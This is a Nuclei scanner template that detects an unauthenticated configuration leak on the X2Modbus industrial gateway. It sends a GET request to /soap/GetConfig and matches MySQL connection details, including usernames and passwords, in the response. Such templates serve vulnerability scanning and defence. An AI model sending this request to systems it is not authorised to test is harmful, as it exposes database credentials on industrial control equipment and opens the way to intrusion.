id: xunraokeji-X2Modbus-GetConfig-unauth

info:
  name: 迅饶科技 X2Modbus网关 GetConfig 信息泄露漏洞
  author: xunraokeji
  severity: high
  tags: X2Modbus,xunraokeji

http:
  - raw:
      - |
        GET /soap/GetConfig HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<MySQL'
          - 'DBPort='
          - 'UserName='
          - 'DBName='
          - 'Password='
          - 'EnableMySQL="1"'
        condition: and
      - type: status
        status: 
          - 200